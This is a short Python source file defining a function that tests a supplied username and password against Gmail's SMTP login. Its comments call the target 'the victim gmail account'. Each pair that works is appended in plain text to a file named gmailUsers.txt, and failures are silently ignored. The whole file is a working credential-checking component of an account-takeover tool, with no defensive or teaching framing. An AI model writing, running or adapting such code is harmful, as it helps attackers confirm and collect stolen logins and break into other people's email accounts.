
import smtplib

def gmailLogin(username,password):
    #login to the victim gmail account
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        try:
            #try to login
            smtp.login(username, password)
            #if the login worked then write the details in the file
            gmailUsers = open("gmailUsers.txt", "a")
            gmailUsers.write("user="+username+" password="+password+"\n")
            gmailUsers.close()
            
        except:
            pass
                